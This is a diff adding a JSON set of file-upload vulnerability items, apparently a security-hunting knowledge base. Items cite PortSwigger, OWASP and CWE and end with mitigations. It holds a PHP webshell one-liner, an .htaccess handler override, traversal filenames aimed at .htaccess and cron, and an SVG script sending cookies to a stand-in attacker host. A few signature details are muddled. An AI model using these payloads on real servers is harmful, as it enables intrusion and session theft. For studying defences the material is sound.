@@ -1,0 +1,316 @@
+{
+  "items": [
+    {
+      "item_key": "upload-mime-type-bypass",
+      "class_id": "file_upload",
+      "kind": "bypass",
+      "claim": "The application validates an uploaded file only against the input-specific Content-Type header, which the client controls and which the server implicitly trusts; an attacker sets Content-Type: image/jpeg while the body is a PHP webshell, the server accepts the file, stores it, and serves/executes it as a web shell.",
+      "body": "1) Submit a multipart POST to the upload endpoint with Content-Type: image/jpeg and a PHP one-liner payload (e.g., <?php echo system($_GET['cmd']); ?>). 2) The server's allowlist check passes because the header is trusted. 3) Retrieve the file at /files/avatars/<file> and observe the script output in the response - arbitrary command execution. 4) PortSwigger's lab solution for 'Web shell upload via Content-Type restriction bypass' is exactly this: change the Content-Type to image/jpeg and the uploaded .php avatar is executed. The HTTP Content-Type header is sent by the browser/client and is trivially spoofable (RFC 1945/2616); nothing forces it to match the file's real bytes, so a client-trusted check alone is meaningless.",
+      "disproof": "If the server re-derives the MIME type from the file's magic bytes (not the header), or re-encodes/decodes the file before storage, the spoofed header is ignored and the payload is blocked; if the upload directory is not executable (scripts served as text/plain) or is outside the webroot, the stored webshell is inert.",
+      "severity_hint": "High",
+      "hunting_value": 4,
+      "sources": [
+        {
+          "host": "portswigger.net",
+          "locator": "Exploiting flawed validation of file uploads / Flawed file type validation",
+          "publisher": "PortSwigger Web Security",
+          "quote": "Problems can arise when the value of this header is implicitly trusted by the server. If no further validation is performed to check whether the contents of the file actually match the supposed MIME type, this defense can be easily bypassed.",
+          "source_type": "primary",
+          "url": "https://portswigger.net/web-security/file-upload"
+        },
+        {
+          "host": "portswigger.net",
+          "locator": "Solution step 6",
+          "publisher": "PortSwigger Web Security",
+          "quote": "In Burp, go back to the proxy history and find the POST /my-account/avatar request. In the part of the message body related to your file, change the specified Content-Type to image/jpeg. Send the request. Observe that the response indicates that your file was successfully uploaded.",
+          "source_type": "primary",
+          "url": "https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass"
+        },
+        {
+          "host": "owasp.org",
+          "locator": "File Upload Protection / Content-Type Validation",
+          "publisher": "OWASP",
+          "quote": "Validate the file type, don't trust the Content-Type header as it can be spoofed.",
+          "source_type": "primary",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"
+        }
+      ]
+    },
+    {
+      "item_key": "upload-extension-blacklist-bypass",
+      "class_id": "file_upload",
+      "kind": "bypass",
+      "claim": "The application blocks dangerous extensions with a blacklist, but the check is bypassable via parsing discrepancies: null-byte truncation (.php%00.jpg), double extensions (.php.jpg), case manipulation (.pHp), trailing characters (.php.), URL-encoded dots (%2Ephp), semicolons before the extension (.asp;.jpg), multibyte unicode dots, and non-recursive stripping of the prohibited string (exploit.p.phphp).",
+      "body": "1) Probe which extensions are blocked; expect .php to be refused. 2) Send filename.php%00.jpg - the check sees .jpg but the underlying engine (legacy PHP < 5.3.4, C/C++ string handling) truncates at the null byte, leaving the real .php extension. 3) Send filename.php.jpg: the filter matches the final segment while the execution rule maps the first/other segment. 4) Send filename%2Ephp - if validation happens on the raw (encoded) name but the server decodes before mapping the extension, the encoded dot defeats the check. 5) Send filename.p.phphp - a non-recursive strip removes the inner .php but leaves .phphp as the executed extension (zetsu.ninja documents each of these). OWASP documents: double extensions, null bytes, case manipulation, alternative extensions (.phtml/.php5), NTFS ADS (shell.asp:.jpg), and generic bad regex as the canonical bypass set.",
+      "disproof": "If extension resolution happens after full percent-decoding and Unicode normalization on both sides (no decoding discrepancy), if null-byte handling is identical across validation and execution, if the filter applies the blacklisting recursively (p.phphp -> phphp -> stripped), and if both sides treat extension names case-sensitively, the payload is inert.",
+      "severity_hint": "High",
+      "hunting_value": 4,
+      "sources": [
+        {
+          "host": "owasp.org",
+          "locator": "Extension Validation - Known bypasses",
+          "publisher": "OWASP",
+          "quote": "Double extensions, e.g. .jpg.php, where it circumvents easily the regex \\\\.jpg | Null bytes, e.g. .php%00.jpg, where .jpg gets truncated and .php becomes the new extension | Case manipulation, e.g. .pHp, .phP | Alternative extensions ... e.g. .phtml, .php5, .pht for PHP ... | Windows NTFS Alternate Data Streams ... | Generic bad regex that isn't properly tested and well reviewed.",
+          "source_type": "primary",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"
+        },
+        {
+          "host": "portswigger.net",
+          "locator": "Obfuscating file extensions",
+          "publisher": "PortSwigger Web Security",
+          "quote": "Even the most exhaustive blacklists can potentially be bypassed using classic obfuscation techniques. Let's say the validation code is case sensitive and fails to recognize that exploit.pHp is in fact a .php file... Provide multiple extensions... Add trailing characters... Try using the URL encoding... Add semicolons or URL-encoded null byte characters... Try using multibyte unicode characters...",
+          "source_type": "primary",
+          "url": "https://portswigger.net/web-security/file-upload"
+        },
+        {
+          "host": "zetsu.ninja",
+          "locator": "Lab: Web shell upload via extension blacklist bypass",
+          "publisher": "zetsu.ninja",
+          "quote": "Adding trailing characters: some mechanisms might stripe trailing characters, dots, whitespaces and slashes after going through the filter, which would allow the file to still be executed, Example: filename.php..",
+          "source_type": "practitioner",
+          "url": "https://zetsu.ninja/book/portswigger/file-upload/"
+        }
+      ]
+    },
+    {
+      "item_key": "upload-magic-byte-bypass",
+      "class_id": "file_upload",
+      "kind": "bypass",
+      "claim": "The application validates only the leading magic bytes of the uploaded file (a fixed prefix such as GIF89a or FF D8 FF E0) and fails to verify the complete signature or the remainder of the content; an attacker uploads a polyglot whose header is a valid image signature followed by the malicious script appended after the signature, so the partial check passes and the file is executed as code.",
+      "body": "1) Generate a file whose first bytes match the target image signature (GIF89a 'GIF89a1234' or JPEG 'GIF89a'/'FF D8 FF E0') with the webshell script appended in the body. 2) Upload it through the filter; the signature check passes because the prefix matches. 3) The server stores the file under a whitelisted extension. 4) When the file is requested, the server's interpreter (PHP) processes the whole file, including the appended payload, because PHP does not stop at the image header. OWASP explicitly warns that file-signature validation 'should not be used on its own, as bypassing it is pretty common and easy', and PortSwigger notes the possibility of hybrid files containing both executable and non-executable content to bypass content filters (GIFAR-style).",
+      "disproof": "If the file is decoded and re-encoded (ImageMagick convert, etc.) before execution - which discards the appended payload - or if the check requires a full/multi-byte signature match plus content-type agreement, or if the stored file is never served as an executable (served as text/plain / attachment), the appended script never runs.",
+      "severity_hint": "High",
+      "hunting_value": 3,
+      "sources": [
+        {
+          "host": "owasp.org",
+          "locator": "File Signature Validation",
+          "publisher": "OWASP",
+          "quote": "This should not be used on its own, as bypassing it is pretty common and easy.",
+          "source_type": "primary",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"
+        },
+        {
+          "host": "portswigger.net",
+          "locator": "Description",
+          "publisher": "PortSwigger Web Security",
+          "quote": "Whether it is possible to construct a hybrid file containing both executable and non-executable content, to bypass any content filters - for example, a file containing both a GIF image and a Java archive (known as a GIFAR file).",
+          "source_type": "primary",
+          "url": "https://portswigger.net/kb/issues/00500980_file-upload-functionality"
+        },
+        {
+          "host": "portswigger.net",
+          "locator": "Exploiting file upload vulnerabilities without remote code execution",
+          "publisher": "PortSwigger Web Security",
+          "quote": "Flawed file type validation ... the website may attempt to check the file type by verifying properties that can be easily manipulated by an attacker using tools like Burp Proxy or Repeater.",
+          "source_type": "primary",
+          "url": "https://portswigger.net/web-security/file-upload"
+        }
+      ]
+    },
+    {
+      "item_key": "upload-server-config-backdoor",
+      "class_id": "file_upload",
+      "kind": "chain_link",
+      "claim": "Chain link: the attacker uploads their own web-server configuration file (.htaccess on Apache, web.config on IIS) into the user-uploaded directory, forcing the server to map a harmless whitelisted extension to an executable MIME type. Even with a strict extension whitelist, subsequent uploads with the whitelisted extension are executed as code.",
+      "body": "1) Upload a .htaccess file whose contents map an arbitrary extension to the PHP interpreter: AddType application/x-httpd-php .l33t (Apache) or <system.webServer><handlers><add name=\\\"x\\\" path=\\\".l33t\\\" verb=\\\"*\\\" type=\\\"ManagedHandler\\\"/></handlers></system.webServer> (IIS web.config). 2) The server accepts the config file and applies it directory-wide. 3) Upload a webshell named exploit.l33t (or exploit.gif/.jpg) - the extension is whitelisted and passes the filter. 4) Request /files/avatars/exploit.l33t and observe execution - the uploaded file is now a web shell. PortSwigger's lab 'Web shell upload via extension blacklist bypass' demonstrates exactly this: the uploaded .htaccess maps .l33t to application/x-httpd-php, then exploit.l33t is executed. OWASP: an uploaded .htaccess / web.config 'could be used to change how that directory handles file types, for example mapping an otherwise harmless extension to be executed by the server'; they recommend disabling per-directory configuration overrides (AllowOverride None, locked IIS handler mappings) as a defense.",
+      "disproof": "If the web server has per-directory configuration overrides disabled (AllowOverride None on Apache; locked IIS handler mapping / disabled web.config inheritance), the uploaded config is ignored; if uploads are stored outside the webroot or the directory has script execution disabled, the reordering of the handler is harmless.",
+      "severity_hint": "Critical",
+      "hunting_value": 5,
+      "sources": [
+        {
+          "host": "portswigger.net",
+          "locator": "Solution steps 4-10",
+          "publisher": "PortSwigger Web Security",
+          "quote": "Change the value of the filename parameter to .htaccess... Replace the contents of the file with the following Apache directive: AddType application/x-httpd-php .l33t... the .l33t file was executed as if it were a .php file.",
+          "source_type": "primary",
+          "url": "https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass"
+        },
+        {
+          "host": "portswigger.net",
+          "locator": "Overriding the server configuration",
+          "publisher": "PortSwigger Web Security",
+          "quote": "You may occasionally find servers that fail to stop you from uploading your own malicious configuration file. In this case, even if the file extension you need is blacklisted, you may be able to trick the server into mapping an arbitrary, custom file extension to an executable MIME type.",
+          "source_type": "primary",
+          "url": "https://portswigger.net/kb/issues/00500980_file-upload-functionality"
+        },
+        {
+          "host": "owasp.org",
+          "locator": "File Storage Location",
+          "publisher": "OWASP",
+          "quote": "Be aware that an attacker may attempt to upload a web server configuration file (.htaccess, web.config) into the upload directory. If the web server allows per-directory configuration overrides, such a file could be used to change how that directory handles file types, for example mapping an otherwise harmless extension to be executed by the server. ... disable per directory configuration overrides on upload directories at the web server level (e.g. Apache AllowOverride None, locked IIS handler mappings).",
+          "source_type": "primary",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"
+        },
+        {
+          "host": "zetsu.ninja",
+          "locator": "Lab: Web shell upload via extension blacklist bypass",
+          "publisher": "zetsu.ninja",
+          "quote": "In some cases, the application fails to prevent users from uploading a configuration file. In the Apache server, there is a method for setting directory-specific configuration, which is through the .htaccess file. By manipulating this file, we can map a custom arbitrary file extension to the file type that we are trying to execute.",
+          "source_type": "practitioner",
+          "url": "https://zetsu.ninja/book/portswigger/file-upload/"
+        }
+      ]
+    },
+    {
+      "item_key": "upload-webshell-rce-chain",
+      "class_id": "file_upload",
+      "kind": "chain_link",
+      "claim": "Chain link: a single unrestricted file upload flaw escalates to full remote code execution. The attacker slips a webshell (PHP/ASP/JSP) past the flawed filter and stores it in a reachable, executable location; a follow-up HTTP request executes the script, returning command output and granting the attacker full control of the server.",
+      "body": "1) Bypass the upload filter (ExtensionBlacklist, MimeType, MagicByte, or server-config chain) and upload a webshell. 2) Confirm the file is stored in the webroot and is served/executed by the server. 3) Send a request to the webshell URL with a command parameter (e.g., ?cmd=id). 4) The server executes the script and reflects the output; the attacker can then read/write arbitrary files, pivot, and use the host for lateral movement. PortSwigger: 'The worst possible scenario is when a website allows you to upload server-side scripts, such as PHP, Java, or Python files, and is also configured to execute them as code... upload a server-side code file that functions as a web shell, effectively granting them full control over the server.' OWASP (Secra): 'The textbook case consists of slipping a webshell past the application's checks and then requesting the uploaded file's URL to take control of the server.' CWE-434 consequence: 'the attacker may be able to specify arbitrary files to write to, leading to a wide variety of consequences, from code execution, XSS, or system crash.'",
+      "disproof": "If the uploaded directory does not execute scripts (served as text/plain), is outside the webroot and only reachable via an ID->filename handler, the server rewrites filenames server-side so the original name is never requested, the file is stored only in a temp/untrusted location and never served, or a CDR/WAF/CDN strips the webshell payload - the chain fails at the execution step.",
+      "severity_hint": "Critical",
+      "hunting_value": 5,
+      "sources": [
+        {
+          "host": "portswigger.net",
+          "locator": "Exploiting unrestricted file uploads to deploy a web shell",
+          "publisher": "PortSwigger Web Security",
+          "quote": "The worst possible scenario is when a website allows you to upload server-side scripts... and is also configured to execute them as code. This makes it trivial to create your own web shell on the server.",
+          "source_type": "primary",
+          "url": "https://portswigger.net/web-security/file-upload"
+        },
+        {
+          "host": "secra.es",
+          "locator": "Introduction",
+          "publisher": "Secra",
+          "quote": "The textbook case consists of slipping a webshell (a PHP, ASPX or JSP script capable of running commands) past the application's checks and then requesting the uploaded file's URL to take control of the server.",
+          "source_type": "practitioner",
+          "url": "https://secra.es/en/blog/file-upload-vulnerability-webshell-rce"
+        },
+        {
+          "host": "cwe.mitre.org",
+          "locator": "Observed Extensions",
+          "publisher": "MITRE",
+          "quote": "Depending on the executing environment, the attacker may be able to specify arbitrary files to write to, leading to a wide variety of consequences, from code execution, XSS (CWE-79), or system crash.",
+          "source_type": "primary",
+          "url": "https://cwe.mitre.org/data/definitions/434.html"
+        },
+        {
+          "host": "zetsu.ninja",
+          "locator": "Lab: Web shell upload via Content-Type restriction bypass",
+          "publisher": "zetsu.ninja",
+          "quote": "The server will execute any file that is uploaded to a specific directory if the server is configured to execute files with that extension, and the uploaded file is accessible via HTTP.",
+          "source_type": "practitioner",
+          "url": "https://zetsu.ninja/book/portswigger/file-upload/"
+        }
+      ]
+    },
+    {
+      "item_key": "upload-overwrite-config",
+      "class_id": "file_upload",
+      "kind": "impact",
+      "claim": "The application trusts the client-supplied filename field and does not validate the save path; an attacker uses '../' sequences in the filename (CWE-23 relative path traversal) to write outside the intended upload directory - overwriting an existing, high-value file such as .htaccess, a web server config, a library the application loads, or a script in the webroot - thereby changing server behavior or achieving code execution from a previously innocuous file.",
+      "body": "1) Inspect the upload request for the filename parameter: filename=\\\"../../../.htaccess\\\" or \\\"....//....//....//etc/cron.d/backdoor\\\". 2) The application writes the file at the computed path, and the traversal escapes the upload sandbox (CWE-434's observed example: 'the creation of the BufferedWriter object is subject to relative path traversal (CWE-23)... an attacker can use \\\"../\\\" sequences to write to files outside of the intended directory'). 3) Overwriting .htaccess changes how the directory is executed (mapping a whitelisted extension to PHP); overwriting a loaded library or a webroot script gives code execution; overwriting a cron entry or system file gives persistence/denial. CWE-434 lists this as a consequence: code execution, XSS (CWE-79), or system crash.",
+      "disproof": "If the filename is sanitized server-side (basename extraction, UUID rename, path construction with a fixed upload root), if the save is jailed in a chroot or directory sandbox, or if the OS sandbox (open_basedir, container seccomp, permissions) prevents writes outside the target directory, the traversal is blocked.",
+      "severity_hint": "High",
+      "hunting_value": 4,
+      "sources": [
+        {
+          "host": "cwe.mitre.org",
+          "locator": "Observed Extensions",
+          "publisher": "MITRE",
+          "quote": "Since the code does not check the filename that is provided in the header, an attacker can use \\\"../\\\" sequences to write to files outside of the intended directory. Depending on the executing environment, the attacker may be able to specify arbitrary files to write to, leading to a wide variety of consequences, from code execution, XSS (CWE-79), or system crash.",
+          "source_type": "primary",
+          "url": "https://cwe.mitre.org/data/definitions/434.html"
+        },
+        {
+          "host": "owasp.org",
+          "locator": "Malicious Files",
+          "publisher": "OWASP",
+          "quote": "The attacker delivered a file for malicious intent, such as: ... Overwrite an existing file on the system.",
+          "source_type": "primary",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"
+        },
+        {
+          "host": "portswigger.net",
+          "locator": "What are file upload vulnerabilities?",
+          "publisher": "PortSwigger Web Security",
+          "quote": "Failing to properly enforce restrictions on these could mean that even a basic image upload function can be used to upload arbitrary and potentially dangerous files instead.",
+          "source_type": "primary",
+          "url": "https://portswigger.net/web-security/file-upload"
+        }
+      ]
+    },
+    {
+      "item_key": "upload-svg-stored-xss",
+      "class_id": "file_upload",
+      "kind": "impact",
+      "claim": "The application accepts and publicly serves an uploaded SVG image that contains inline scriptable content (e.g., <script>alert(1)</script>, <image xlink:href=\\\"javascript:alert(1)\\\">, <iframe srcdoc>, or a data URI); because the file is served from the same origin as the upload endpoint, any user who renders the SVG executes the script in the application's origin - stored XSS with session theft, CSRF, or defacement as the impact.",
+      "body": "1) Upload an SVG containing <svg onload=alert(document.cookie)> or <script>fetch('//attacker/?c='+document.cookie)</script> with Content-Type image/svg+xml. 2) The server stores it and serves it via a public URL on the same origin. 3) A victim requests the URL; the browser parses image/svg+xml as SVG (which is HTML-parsing based) and executes the inline script in the origin of the upload endpoint (PortSwigger: the same-origin restriction means the attack only works when the uploaded file is served from the same origin). zetsu.ninja: 'if you can upload HTML files or SVG images, you can potentially use <script> tags to create stored XSS payloads.' PortSwigger: 'if you can upload HTML files or SVG images, you can potentially use <script> tags to create stored XSS payloads. If the uploaded file then appears on a page that is visited by other users, their browser will execute the script when it tries to render the page. Note that due to same-origin policy restrictions, these kinds of attacks will only work if the uploaded file is served from the same origin to which you upload it.'",
+      "disproof": "If the upload endpoint strips/escapes <script> and event handlers, or stores only sanitized SVG (no script-capable elements), or if the file is served with Content-Disposition: attachment / X-Content-Type-Options: nosniff (preventing MIME sniffing and script execution), or if it is hosted on a separate origin (e.g., a CDN on a different domain), the script never executes.",
+      "severity_hint": "Medium",
+      "hunting_value": 3,
+      "sources": [
+        {
+          "host": "portswigger.net",
+          "locator": "Exploiting file upload vulnerabilities without remote code execution / Uploading malicious client-side scripts",
+          "publisher": "PortSwigger Web Security",
+          "quote": "you can upload HTML files or SVG images, you can potentially use <script> tags to create stored XSS payloads. If the uploaded file then appears on a page that is visited by other users, their browser will execute the script when it tries to render the page. Note that due to same-origin policy restrictions, these kinds of attacks will only work if the uploaded file is served from the same origin to which you upload it.",
+          "source_type": "primary",
+          "url": "https://portswigger.net/web-security/file-upload"
+        },
+        {
+          "host": "secra.es",
+          "locator": "Exploiting file upload vulnerabilities without remote code execution",
+          "publisher": "Secra",
+          "quote": "Although you might not be able to execute scripts on the server, you may still be able to upload scripts for client-side attacks. For example, if you can upload HTML files or SVG images, you can potentially use <script> tags to create stored XSS payloads.",
+          "source_type": "practitioner",
+          "url": "https://secra.es/en/blog/file-upload-vulnerability-webshell-rce"
+        },
+        {
+          "host": "owasp.org",
+          "locator": "Malicious Files",
+          "publisher": "OWASP",
+          "quote": "The attacker delivered a file for malicious intent, such as: 1. Exploit vulnerabilities in the file parser or processing module ... 4. Client-side active content (XSS, CSRF, etc.) that could endanger other users if the files are publicly retrievable.",
+          "source_type": "primary",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"
+        }
+      ]
+    },
+    {
+      "item_key": "upload-mitigation",
+      "class_id": "file_upload",
+      "kind": "mitigation",
+      "claim": "Defense in depth: validate and sanitize before storing, then isolate and harden the stored file. Controls: extension allowlist (not blacklist); re-derive MIME from content, not the header; full signature validation and decode/re-encode (e.g., ImageMagick) before execution; random server-side filename (UUID); enforce filename length, allowlisted characters, no traversal/leading-dot/colon; store outside the webroot or on a separate host with an ID->filename handler; disable script execution in the upload directory; disable per-directory config overrides (AllowOverride None, locked IIS mappings); enforce file-size limits; require a CSRF token; scan with AV/CDR; serve files with X-Content-Type-Options: nosniff and a non-generic Content-Type.",
+      "body": "1) Apply a strict extension allowlist and validate the filename after decoding, rejecting traversal, leading dots, and colons (NTFS ADS). 2) Validate content: check the full signature, re-encode images, and only trust the resulting bytes. 3) Store server-side-renamed files outside the webroot or on a separate host, with per-request size caps and an antivirus/CDR pass. 4) Hardening: block script execution in the upload directory, disable per-directory configuration overrides, and add nosniff plus an attachment Content-Type on every served file. OWASP prevention: 'Check the file extension against a whitelist of permitted extensions rather than a blacklist', 'Make sure the filename doesn't contain any substrings that may be interpreted as a directory', 'Rename uploaded files to avoid collisions', 'Do not upload files to the server's permanent filesystem until they have been fully validated', 'use an established framework'. PortSwigger remediation: 'Inspect the content of uploaded files, and enforce a whitelist of accepted, non-executable content types. Additionally, enforce a blacklist of common executable formats'; 'Enforce a whitelist of accepted, non-executable file extensions'; 'supply an accurate non-generic Content-Type header, the X-Content-Type-Options: nosniff header, and also a Content-Disposition header that specifies that browsers should handle the file as an attachment.'",
+      "disproof": "Any single control is bypassable by itself; the standard failure mode is a whitelist that is never applied to the right layer (validation at the wrong time, or no decode before the check) or an executable upload directory that defeats a strict extension allowlist. Defense-in-depth is the only durable posture: if one layer fails, the others still stop the attack.",
+      "severity_hint": "Medium",
+      "hunting_value": 3,
+      "sources": [
+        {
+          "host": "owasp.org",
+          "locator": "Prevention",
+          "publisher": "OWASP",
+          "quote": "Check the file extension against a whitelist of permitted extensions rather than a blacklist... Make sure the filename doesn't contain any substrings that may be interpreted as a directory or a traversal sequence (../)... Rename uploaded files to avoid collisions... Do not upload files to the server's permanent filesystem until they have been fully validated... use an established framework for preprocessing file uploads.",
+          "source_type": "primary",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"
+        },
+        {
+          "host": "portswigger.net",
+          "locator": "Remediation",
+          "publisher": "PortSwigger Web Security",
+          "quote": "Inspect the content of uploaded files, and enforce a whitelist of accepted, non-executable content types. Additionally, enforce a blacklist of common executable formats, to hinder hybrid file attacks. Enforce a whitelist of accepted, non-executable file extensions. If uploaded files are downloaded by users, supply an accurate non-generic Content-Type header, the X-Content-Type-Options: nosniff header, and also a Content-Disposition header that specifies that browsers should handle the file as an attachment.",
+          "source_type": "primary",
+          "url": "https://portswigger.net/web-security/file-upload"
+        },
+        {
+          "host": "owasp.org",
+          "locator": "File Storage Location",
+          "publisher": "OWASP",
+          "quote": "Store the files on a different server. If that's not possible, store them outside the webroot ... Use a handler that gets mapped to filenames inside the application (someid -> file.ext) ... Run the file through an antivirus or a sandbox ... Run the file through CDR ... Ensure that any libraries used are securely configured and kept up to date",
+          "source_type": "primary",
+          "url": "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"
+        },
+        {
+          "host": "portswigger.net",
+          "locator": "Preventing file execution in user-accessible directories",
+          "publisher": "PortSwigger Web Security",
+          "quote": "While it's clearly better to prevent dangerous file types being uploaded in the first place, the second line of defense is to stop the server from executing any scripts that do slip through the net.",
+          "source_type": "primary",
+          "url": "https://portswigger.net/web-security/file-upload"
+        }
+      ]
+    }
+  ]
+}
